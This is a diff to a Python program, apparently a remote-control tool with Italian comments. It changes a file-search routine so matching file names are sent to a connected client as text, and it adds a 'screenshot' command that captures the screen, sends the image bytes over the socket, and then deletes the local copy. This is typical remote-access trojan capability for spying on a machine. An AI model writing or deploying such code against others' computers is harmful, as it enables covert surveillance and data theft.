@@ -173,10 +173,11 @@ def find(comando, client):
         for item in genericlist:
             if item.endswith(estensione):
                 counter_elemets += 1
-                specificlist.append(item)
-        specificlist.append("Numero di elementi trovati: "+ str(counter_elemets))
-        data = pickle.dumps(specificlist)
-        client.send(data)
+                specificlist.append("-: " + item + "\n")
+        specificlist.append("\nNumero di elementi trovati: "+ str(counter_elemets))
+        data = ''.join(specificlist)
+        client.send((data).encode(FORMAT))
+
     except Exception as e:
         if e.__class__.__name__ == "ConnectionResetError":
             client.send(("Connessione interrotta").encode(FORMAT))
@@ -244,8 +245,21 @@ def openRemoteControl(client):
                 time.sleep(1.5)
             elif comando[0:10]=="screenshot":
                 myScreenshot = pyautogui.screenshot()
-                clientConnection().send(myScreenshot.encode())
-            #Tutti gli altri commandi
+                myScreenshot.save(os.getcwd() + "\screen.png")
+                try:
+                    filename = "screen.png"
+                    filesize = os.path.getsize(filename)
+                    with open(filename, 'rb') as f:
+                        line = f.read(filesize)
+                        client.send((str(filesize)).encode(FORMAT))
+                        time.sleep(3)
+                        client.send(line)
+                        f.close()
+                except:
+                    client.send(("Download fallito").encode(FORMAT))
+
+                os.remove("screen.png")
+                #Tutti gli altri commandi
             else:
                 pass
 
